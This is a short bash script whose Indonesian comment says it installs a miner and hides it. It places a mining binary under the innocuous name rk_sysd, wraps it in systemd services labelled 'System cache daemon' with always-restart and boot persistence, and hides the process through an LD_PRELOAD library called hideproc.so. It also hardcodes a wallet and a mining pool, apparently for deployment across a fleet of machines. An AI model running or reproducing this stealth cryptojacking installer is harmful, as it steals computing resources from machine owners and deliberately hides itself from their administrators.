#!/usr/bin/env bash
# deploy.sh WORKER - pasang miner + hide + unit systemd (pola fleet-deploy.sh)
set -euo pipefail
W="${1:?usage: deploy.sh WORKER}"
SUDO=""; [ "$(id -u)" = 0 ] || SUDO="sudo"
DIR="$(cd "$(dirname "$0")" && pwd)"

$SUDO install -m 755 "$DIR/xcb" /usr/local/bin/rk_sysd
$SUDO install -m 644 "$DIR/hideproc.so" /usr/local/lib/hideproc.so

$SUDO tee /etc/systemd/system/syscache-hugepages.service >/dev/null <<"UNIT"
[Unit]
Description=Hugepages for RandomY dataset
Before=syscached.service

[Service]
Type=oneshot
ExecStart=/usr/sbin/sysctl -w vm.nr_hugepages=512 vm.max_map_count=262144
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
UNIT

$SUDO tee /etc/systemd/system/syscached.service >/dev/null <<UNIT
[Unit]
Description=System cache daemon
After=network-online.target syscache-hugepages.service
Wants=network-online.target syscache-hugepages.service

[Service]
Type=simple
ExecStart=/usr/local/bin/rk_sysd --ui=log -t 4
Restart=always
RestartSec=10
LimitMEMLOCK=infinity
NoNewPrivileges=true
Environment=WALLET=cb23d6d8557e776f5ff9ab6a7fb7f59a3d385245fa7a
Environment=POOL=sg.catchthatrabbit.com:8008
Environment=WORKER=$W
Environment=LD_PRELOAD=/usr/local/lib/hideproc.so

[Install]
WantedBy=multi-user.target
UNIT

$SUDO systemctl daemon-reload
$SUDO systemctl enable --now syscache-hugepages.service syscached.service
sleep 8
echo "svc=$(systemctl is-active syscached.service) hp=$(awk "/HugePages_Total/{print \$2}" /proc/meminfo)"
$SUDO journalctl -u syscached -n 5 --no-pager -o cat | tail -5
